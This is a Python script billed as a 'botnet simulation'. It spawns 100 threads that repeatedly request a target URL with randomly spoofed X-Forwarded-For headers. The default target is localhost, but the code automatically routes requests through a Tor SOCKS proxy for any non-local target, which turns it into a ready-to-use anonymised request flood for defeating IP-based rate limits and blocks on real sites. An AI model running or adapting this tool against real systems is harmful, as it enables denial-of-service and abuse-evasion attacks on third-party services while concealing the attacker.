import threading
import requests
import time
import random

# Target your local test server
TARGET_URL = "http://127.0.0.1:5000/"

# Number of bots and requests per bot
NUM_BOTS = 100
REQUESTS_PER_BOT = 10
DELAY = 0.2  # seconds between requests per bot

def generate_random_ip():
    return ".".join(str(random.randint(1, 254)) for _ in range(4))

def bot_worker(bot_id):
    fake_ip = generate_random_ip()
    headers = {"X-Forwarded-For": fake_ip}

    # Update this proxy address to your proxy or TOR proxy
    if TARGET_URL.startswith("http://127.") or TARGET_URL.startswith("http://10."):
     proxies = None  # Don't use TOR for local/test environments
    else:
     proxies = {
        "http": "socks5h://127.0.0.1:9050",
        "https": "socks5h://127.0.0.1:9050",
    }


    for i in range(REQUESTS_PER_BOT):
        try:
            response = requests.get(TARGET_URL, headers=headers, proxies=proxies, timeout=10)
            print(f"[Bot {bot_id}] IP: {fake_ip} | Status: {response.status_code}")
        except Exception as e:
            print(f"[Bot {bot_id}] Error: {e}")
        time.sleep(DELAY)

threads = []
for bot_id in range(NUM_BOTS):
    t = threading.Thread(target=bot_worker, args=(bot_id,))
    threads.append(t)
    t.start()

for t in threads:
    t.join()

print("Botnet simulation with proxy complete.")
